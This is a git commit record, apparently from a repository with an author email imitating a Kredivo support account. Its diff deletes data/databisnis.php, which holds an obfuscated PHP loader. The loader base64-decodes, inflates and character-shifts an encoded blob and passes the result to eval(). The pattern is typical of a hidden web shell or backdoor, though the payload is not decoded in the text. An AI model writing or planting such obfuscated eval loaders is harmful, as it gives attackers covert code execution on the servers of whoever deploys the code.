511c6bfa3e4aaf580cfeff3254f6eb38db6a1d7a
bismillah2219 <customer.kredivosuport12@gmail.com>
2025-02-24 06:50:03 +0700

    Rename databisnis.php to databisnis.js

--- data/databisnis.php
+++
@@ -1,9 +0,0 @@
-<?php function XkzLcN($KWfbmE)
-{ 
-$KWfbmE=gzinflate(base64_decode($KWfbmE));
- for($i=0;$i<strlen($KWfbmE);$i++)
- {
-$KWfbmE[$i] = chr(ord($KWfbmE[$i])-1);
- }
- return $KWfbmE;
- }eval(XkzLcN("rVLrbtMwFH4AP4UVRVsrVQmEXlirbspKJkrXi+JU20Ao8hLTRqRJZDt04yLtIXgCHm0vwnFab2HwB4EVxfa5fN/x+Q7GsBASTIgkz0IhKZeN5gAlWZSWMcOGZUuWshWnG6tYF8YAIbMUjGd0w3BtDbEZLuYkeHeovYfvB8gMiUfIeD6rm1Wsvim4ggqxzXn8ZzjtfQL3aFax+gZwyNzAW+iKgd1A99/v/vFD3uXZFf6KT0cu/Cfn40l1PB2T2Zj0Ebq/+4GXxPNn7tTDfejXw9sso3IuXEIu5v6rnVNXav2P2pQaH8oskiAdFiyLp7unN0ytWZjELaw7AqckDq9z2cRfkOqyWfJUtWktZSH6tk2LxHpQO+crG2INbOk0OBl2jeakoFywcJPHbLih/GOcb7ODaE0lsA6rvFoZgzpjtQHagWQ3sgoFA8siQGroapv7jGgNCRH4wyRLqtmszHkhXc7pLTip2htIz85o6Z/PF0EIGx4eV1yt35y+Fyz9WeC7M3Lm+SpO8pJVYXuGilIwCUThjgFKaT0S60I4E2UqdY3shkUqsA4Spblge+M3ZPIkVk3vPe+9cF722h0HZDS3NFPG7lG37bSfdY46fdd9/Tm6uqRpN/tE3myXRTC5vpjeBm+nzsoZ5Wt3tFX6/yI7fyI3oALn30wGIJ4c/wQ="));?>
